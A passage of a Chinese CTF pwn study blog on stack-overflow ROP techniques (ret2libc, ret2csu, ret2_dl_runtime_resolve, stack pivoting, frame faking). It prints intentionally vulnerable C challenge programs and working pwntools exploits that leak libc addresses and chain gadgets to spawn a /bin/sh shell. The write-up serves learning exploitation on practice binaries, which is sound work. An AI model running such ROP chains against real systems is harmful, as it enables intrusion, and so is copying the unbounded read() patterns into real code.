&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LibcSearcher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__libc_start_main&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">libc_start_main_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libcbase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_start_main_addr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;__libc_start_main&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libcbase&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libcbase&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;str_bin_sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;bbbb&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="中级rop">中级ROP&lt;/h3>
&lt;h3 id="ret2csu">ret2csu&lt;/h3>
&lt;p>利用 x64 下的 __libc_csu_init 中的 gadgets.&lt;/p>
&lt;p>eg:level5:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#undef _FORTIFY_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vulnerable_function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">512&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDOUT_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Hello, World&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vulnerable_function&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>exp:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ret2reg">ret2reg&lt;/h3>
&lt;ul>
&lt;li>略 无题目&lt;/li>
&lt;/ul>
&lt;h3 id="brop">BROP&lt;/h3>
&lt;ul>
&lt;li>略 无二进制&lt;/li>
&lt;/ul>
&lt;h3 id="高级rop">高级ROP&lt;/h3>
&lt;h3 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve&lt;/h3>
&lt;p>XDCTF2015-pwn200&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">256&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;Welcome to XDCTF2015~!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//gcc -o bof -m32 -fno-stack-protector bof.c
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="srop">SROP&lt;/h3>
&lt;h3 id="ret2vdso">ret2VDSO&lt;/h3>
&lt;h3 id="花式栈溢出">花式栈溢出&lt;/h3>
&lt;ul>
&lt;li>stack pivoting&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank" rel="noopener"
>X-CTF Quals 2016 - b0verfl0w&lt;/a>&lt;/p>
&lt;p>转移堆：&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200" target="_blank" rel="noopener"
>EkoPartyCTF 2016 fuckzing-exploit-200&lt;/a>&lt;/p>
&lt;ul>
&lt;li>frame faking&lt;/li>
&lt;/ul>
&lt;p>2018 安恒杯 over&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190522130814.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>直接EXP 分析，，困扰了很久的exp&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">binary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;./over.over&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">DEBUG&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">raw_input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;DEBUG: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">gdb&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">attach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./over.over&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./over.over&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">libc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x7f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x70&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;stack -&amp;gt; &lt;/span>&lt;span class="si">{:#x}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># DEBUG(&amp;#34;b *0x4006B9\nc&amp;#34;) 96&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;11111111&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x400793&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mh">0x400676&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">40&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x4006be&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x7f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">success&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;libc.address -&amp;gt; &lt;/span>&lt;span class="si">{:#x}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdi_ret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x400793&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;#34;pop|ret&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">0x00000000000f5279 : pop rdx ; pop rsi ; ret
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdx_pop_rsi_ret&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">0xf5279&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;22222222&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pop_rdi_ret&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">)),&lt;/span>&lt;span class="n">pop_rdx_pop_rsi_ret&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;execve&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">8&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stack&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x30&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x4006be&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>Stack smash&lt;/li>
&lt;/ul>
&lt;p>35c3 CTF readme&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190522132544.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
